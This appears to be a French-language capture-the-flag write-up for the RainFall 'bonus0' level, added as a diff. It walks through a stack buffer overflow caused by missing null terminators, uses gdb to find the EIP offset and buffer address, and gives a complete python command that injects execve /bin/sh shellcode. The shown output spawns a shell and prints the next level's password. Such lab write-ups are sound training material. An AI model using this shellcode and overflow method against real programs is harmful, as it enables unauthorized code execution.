@@ -1,0 +1,103 @@
+Ce binaire ouvre un stream qui nous demande d'entrer 1 premier argument puis un deuxieme.
+
+bonus0@RainFall:~$ ./bonus0
+ -
+banane
+ -
+chocolat
+banane chocolat
+
+Apres avoir rentrer les deux argv. Le programme retourne une chaine concatener avec un espace
+
+En regardant de plus pres on remarque que les deux argv on un buffer de 20.
+Donc le retour est 20 + 1 (le 1 etant pour l'espace) + 20 ce qui nous donnes 41
+
+Cependant dans le main pp prend un buffer de 42. Si nous depassont ce buffer il est deja dans un premier temps possible
+
+De segfault le programme
+
+bonus0@RainFall:~$ ./bonus0
+ -
+12345678912345678900
+ -
+123456789ABCDEFGHIJK
+12345678912345678900123456789ABCDEFGHIJK�� 123456789ABCDEFGHIJK��
+Segmentation fault (core dumped)
+
+pp appelle p qui lui read un buffer de 4096 avec aucun '\0'. Si le premier buffer est de 20 ou plus ainsi que le deuxieme.
+Cependant comme le argv[2] na pas de point null alors il se reecris.
+Ce qui donne 19 bytes plus.
+
+On a donc 19 bytes pour reecrire le registre eip
+
+Pour trouver l'offset on va utiliser un pattern pour voir a quel moment la eip segfault.
+
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+12345678901234567890
+ -
+1234567890BANOP12345
+123456789012345678901234567890BANOP12345�� 1234567890BANOP12345��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x4e414230 in ?? ()
+(gdb) info regiset
+Undefined info command: "regiset".  Try "help info".
+(gdb) info register
+eax            0x0	0
+ecx            0xffffffff	-1
+edx            0xb7fd28b8	-1208145736
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff710	0xbffff710
+ebp            0x39383736	0x39383736
+esi            0x0	0
+edi            0x0	0
+eip            0x4e414230	0x4e414230
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+
+0x4e414230 converti en string = "0BAN" ce qui commence au 9ieme bytes
+
+Maintenant l'idee c'est de trouver l'endroit ou start le [argv[1] + arg[2] + espace + argv[2]] (61)
+apres les 4096
+
+
+
+Pour le premier argument on va injecter notre shellcode comme dans le level9 avec un padding supp a 61 et inferieur a 4096
+
+Et pour le deuxieme un padding de 16 + l'addresse ou starte le 61ieme bytes
+
+pour le trouver
+
+(gdb) b *p+28
+Breakpoint 1 at 0x80484d0
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+
+Breakpoint 1, 0x080484d0 in p ()
+(gdb) x $ebp-0x1000
+0xbfffe658:	0x00000000
+(gdb) x $ebp-0x1000 + 61
+0xbfffe695:	0x00000000
+(gdb)
+
+ce qu'on cherche est 0xbfffe695
+
+Apres on rentre notre injection
+
+bonus0@RainFall:~$ (python -c 'print "B" * 120+ "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c print'"B" * 9 + "\x95\xe6\xff\xbf" + "A" * 7'; cat) | ./bonus0
+ -
+ -
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBB����AAAAAAA�� BBBBBBBBB����AAAAAAA��
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
